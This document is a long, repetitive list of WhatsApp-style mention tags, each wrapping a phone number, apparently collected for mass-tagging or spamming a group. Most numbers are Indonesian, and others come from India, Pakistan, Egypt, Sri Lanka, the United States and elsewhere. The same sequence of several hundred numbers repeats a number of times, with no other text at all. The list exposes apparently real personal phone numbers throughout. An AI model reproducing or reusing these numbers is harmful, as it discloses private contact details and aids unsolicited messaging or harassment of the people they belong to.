~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~  ~_*@94786859370*_~ ~_*@6282189885009*_~ ~_*@62895338123500*_~ ~_*@6285866316854*_~ ~_*@201159634926*_~ ~_*@201158302336*_~ ~_*@6285348244140*_~ ~_*@6288212643727*_~ ~_*@6289604529240*_~ ~_*@923188794545*_~ ~_*@6282350181384*_~ ~_*@18655686614*_~ ~_*@6289519370667*_~ ~_*@60128617298*_~ ~_*@6283878849138*_~ ~_*@917400393728*_~ ~_*@2348170397144*_~ ~_*@6285730888458*_~ ~_*@6285895467588*_~ ~_*@994404688405*_~ ~_*@2347063484826*_~ ~_*@6287723518101*_~ ~_*@15402995426*_~ ~_*@923063049568*_~ ~_*@918607935816*_~ ~_*@6282351749689*_~ ~_*@94770576656*_~ ~_*@6283893040355*_~ ~_*@6285811422081*_~ ~_*@6285296476144*_~ ~_*@6281293580373*_~ ~_*@62895374180203*_~ ~_*@201050410103*_~ ~_*@967736206078*_~ ~_*@6285236219021*_~ ~_*@6289621588181*_~ ~_*@6289686158110*_~ ~_*@62881036169000*_~ ~_*@919539213231*_~ ~_*@917592017981*_~ ~_*@923444164397*_~ ~_*@6283849992226*_~ ~_*@6282268795060*_~ ~_*@6285389714695*_~ ~_*@994404932827*_~ ~_*@6283171419347*_~ ~_*@201143521095*_~ ~_*@6285881843277*_~ ~_*@6283863438481*_~ ~_*@6281288636847*_~ ~_*@12199129598*_~ ~_*@6281539383753*_~ ~_*@62812498405442*_~ ~_*@6285748134061*_~ ~_*@6281256133894*_~ ~_*@6281211620277*_~ ~_*@16013016141*_~ ~_*@918714485001*_~ ~_*@994405134976*_~ ~_*@6281369684262*_~ ~_*@923422178323*_~ ~_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~  ~_*@94786859370*_~ ~_*@6282189885009*_~ ~_*@62895338123500*_~ ~_*@6285866316854*_~ ~_*@201159634926*_~ ~_*@201158302336*_~ ~_*@6285348244140*_~ ~_*@6288212643727*_~ ~_*@6289604529240*_~ ~_*@923188794545*_~ ~_*@6282350181384*_~ ~_*@18655686614*_~ ~_*@6289519370667*_~ ~_*@60128617298*_~ ~_*@6283878849138*_~ ~_*@917400393728*_~ ~_*@2348170397144*_~ ~_*@6285730888458*_~ ~_*@6285895467588*_~ ~_*@994404688405*_~ ~_*@2347063484826*_~ ~_*@6287723518101*_~ ~_*@15402995426*_~ ~_*@923063049568*_~ ~_*@918607935816*_~ ~_*@6282351749689*_~ ~_*@94770576656*_~ ~_*@6283893040355*_~ ~_*@6285811422081*_~ ~_*@6285296476144*_~ ~_*@6281293580373*_~ ~_*@62895374180203*_~ ~_*@201050410103*_~ ~_*@967736206078*_~ ~_*@6285236219021*_~ ~_*@6289621588181*_~ ~_*@6289686158110*_~ ~_*@62881036169000*_~ ~_*@919539213231*_~ ~_*@917592017981*_~ ~_*@923444164397*_~ ~_*@6283849992226*_~ ~_*@6282268795060*_~ ~_*@6285389714695*_~ ~_*@994404932827*_~ ~_*@6283171419347*_~ ~_*@201143521095*_~ ~_*@6285881843277*_~ ~_*@6283863438481*_~ ~_*@6281288636847*_~ ~_*@12199129598*_~ ~_*@6281539383753*_~ ~_*@62812498405442*_~ ~_*@6285748134061*_~ ~_*@6281256133894*_~ ~_*@6281211620277*_~ ~_*@16013016141*_~ ~_*@918714485001*_~ ~_*@994405134976*_~ ~_*@6281369684262*_~ ~_*@923422178323*_~ ~_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~  ~_*@94786859370*_~ ~_*@6282189885009*_~ ~_*@62895338123500*_~ ~_*@6285866316854*_~ ~_*@201159634926*_~ ~_*@201158302336*_~ ~_*@6285348244140*_~ ~_*@6288212643727*_~ ~_*@6289604529240*_~ ~_*@923188794545*_~ ~_*@6282350181384*_~ ~_*@18655686614*_~ ~_*@6289519370667*_~ ~_*@60128617298*_~ ~_*@6283878849138*_~ ~_*@917400393728*_~ ~_*@2348170397144*_~ ~_*@6285730888458*_~ ~_*@6285895467588*_~ ~_*@994404688405*_~ ~_*@2347063484826*_~ ~_*@6287723518101*_~ ~_*@15402995426*_~ ~_*@923063049568*_~ ~_*@918607935816*_~ ~_*@6282351749689*_~ ~_*@94770576656*_~ ~_*@6283893040355*_~ ~_*@6285811422081*_~ ~_*@6285296476144*_~ ~_*@6281293580373*_~ ~_*@62895374180203*_~ ~_*@201050410103*_~ ~_*@967736206078*_~ ~_*@6285236219021*_~ ~_*@6289621588181*_~ ~_*@6289686158110*_~ ~_*@62881036169000*_~ ~_*@919539213231*_~ ~_*@917592017981*_~ ~_*@923444164397*_~ ~_*@6283849992226*_~ ~_*@6282268795060*_~ ~_*@6285389714695*_~ ~_*@994404932827*_~ ~_*@6283171419347*_~ ~_*@201143521095*_~ ~_*@6285881843277*_~ ~_*@6283863438481*_~ ~_*@6281288636847*_~ ~_*@12199129598*_~ ~_*@6281539383753*_~ ~_*@62812498405442*_~ ~_*@6285748134061*_~ ~_*@6281256133894*_~ ~_*@6281211620277*_~ ~_*@16013016141*_~ ~_*@918714485001*_~ ~_*@994405134976*_~ ~_*@6281369684262*_~ ~_*@923422178323*_~ ~_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~
_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ ~_*@994404930787*_~ ~_*@6287877948255*_~ ~_*@6282217512054*_~ ~_*@94775701544*_~ ~_*@917984503350*_~ ~_*@15155167158*_~ ~_*@923093213360*_~ ~_*@94752086171*_~ ~_*@6285230211772*_~ ~_*@6285374055646*_~ ~_*@447451203393*_~ ~_*@6281536125364*_~ ~_*@919536476115*_~ ~_*@6289515921681*_~ ~_*@6283134144119*_~ ~_*@628990430357*_~ ~_*@6285336076049*_~ ~_*@62895416344144*_~ ~_*@6287788140439*_~ ~_*@94741052880*_~ ~_*@6282324854495*_~ ~_*@601123108336*_~ ~_*@917009350832*_~ ~_*@201285792875*_~ ~_*@6282241521002*_~ ~_*@628979612842*_~ ~_*@966538809225*_~ ~_*@923431162232*_~ ~_*@6281336483513*_~ ~_*@201281376757*_~ ~_*@6283167635312*_~ ~_*@60143381135*_~ ~_*@916235177919*_~ ~_*@917025834983*_~ ~_*@6283802447960*_~ ~_*@6282252328975*_~ ~_*@212681623045*_~ ~_*@6285719346409*_~ ~_*@6283130567584*_~ ~_*@94714351380*_~ ~_*@6281336391397*_~ ~_*@6289629867201*_~ ~_*@994407574441*_~ ~_*@628888454189*_~ ~_*@6285764182586*_~ ~_*@6285803581164*_~ ~_*@6285342191824*_~ ~_*@6281291050802*_~ ~_*@6287876888056*_~
_*@6288239432837*_~ ~_*@6282125185017*_~ ~_*@6283857901399*_~ ~_*@6285718520257*_~ ~_*@6285268335797*_~ ~_*@6287805781838*_~ ~_*@919995821144*_~ ~_*@6285707049290*_~ ~_*@994404208792*_~ ~_*@6289606878574*_~ ~_*@19122002346*_~ ~_*@6282137905843*_~ ~_*@6288246276402*_~ ~_*@917888782079*_~ ~_*@6281549304320*_~ ~_*@93700670416*_~ ~_*@62895602640500*_~ ~_*@6283137348303*_~ ~_*@6282277340989*_~ ~_*@6285719047077*_~ ~_*@923332419875*_~ ~_*@6285773803759*_~ ~_*@62895330055646*_~ ~_*@989011979331*_~ ~_*@6285892704151*_~ ~_*@923064152842*_~ ~_*@18106699886*_~ ~_*@6281219115363*_~ ~_*@994404632924*_~ ~_*@6283870804643*_~ ~_*@62821714119799*_~ ~_*@6285740777659*_~ ~_*@6289646719301*_~ ~_*@628973457899*_~ ~_*@601158950230*_~ ~_*@6283169109953*_~ ~_*@6281294724116*_~ ~_*@6285702763110*_~ ~_*@994405217794*_~ ~_*@6285859261470*_~ ~_*@6285952449536*_~ ~_*@6281933836096*_~ ~_*@6281246585773*_~ ~_*@6288801389342*_~ ~_*@6282228426875*_~ ~_*@6288239682804*_~ ~_*@6289659102517*_~ ~_*@923123460631*_~ ~_*@94779790605*_~ ~_*@6285921136667*_~ ~_*@16613388772*_~ ~_*@6281930302783*_~ ~_*@6283894155113*_~ ~_*@6281289357876*_~ ~_*@6283844521195*_~ ~_*@6282384777931*_~ ~_*@62857548700281*_~ ~_*@6288238117298*_~ ~_*@6285379935220*_~ ~_*@6285706158331*_~ ~_*@6289624991072*_~ ~_*@6289519949340*_~ ~_*@201094813195*_~ ~_*@923090130290*_~ ~_*@989371689317*_~ ~_*@6283191728517*_~ ~_*@994405070142*_~ ~_*@6281211037493*_~ ~_*@917012017714*_~ ~_*@994403611610*_~ ~_*@923064813524*_~ ~_*@62821714119794*_~ ~_*@6288270958065*_~ ~_*@994406125781*_~ ~_*@447451223889*_~ ~_*@6281914303083*_~ ~_*@62822846759572 ~_*@6287771662257*_~ ~_*@6287803194784*_~ ~_*@6289689355005*_~ ~_*@62817566588*_~ ~_*@6281230819694*_~ ~_*@6283191728465*_~ ~_*@62813620978671*_~ ~_*@6282132516871*_~ ~_*@6281291488045*_~ ~_*@8801910644095*_~ ~_*@6282278350396*_~ ~_*@6282389346208*_~ ~_*@6289630013186*_~ ~_*@6282140467102*_~ ~_*@917594017997*_~ ~_*@6281280416799*_~ ~_*@6283122641733*_~ ~_*@6285721109341*_~ ~_*@15013945963*_~ ~_*@447441412811*_~ ~_*@6287841951610*_~ ~_*@6285784297549*_~ ~_*@6287801486293*_~ ~_*@6285754694855*_~ ~_*@6285256121311*_~ ~_*@6285890365148*_~ ~_*@6285609226137*_~ ~_*@6288801609116*_~ ~_*@994406629357*_~ ~_*@6288262124327*_~ ~_*@6281318764971*_~ ~_*@6281390175685*_~ ~_*@6281378573913*_~ ~_*@6281327603617*_~ ~_*@6281515150379*_~ ~_*@15714963851*_~ ~_*@94740638429*_~ ~_*@6282119038109*_~ ~_*@6287716031689*_~ ~_*@6285722051903*_~ ~_*@919606313477*_~ ~_*@6281937626921*_~ ~_*@6282171411979*_~ ~_*@6285819842967*_~ ~_*@6281368772718*_~ ~_*@6285298141808*_~ ~_*@6285841829470*_~ ~_*@994406094869*_~ ~_*@6285891732313*_~ ~_*@994403267515*_~ ~_*@6285342632376*_~ ~_*@6281316145165*_~ ~_*@16139093788*_~ ~_*@923059643528*_~ ~_*@6281284993301*_~ ~_*@994407444174*_~ ~_*@6288225604143*_~ ~_*@6287869574280*_~ ~_*@6283802307109*_~ ~_*@6289508741708*_~ ~_*@62895341977572*_~ ~_*@6283119129574*_~ ~_*@6282335826785*_~ ~_*@6282244611406*_~ ~_*@6281213350499*_~ 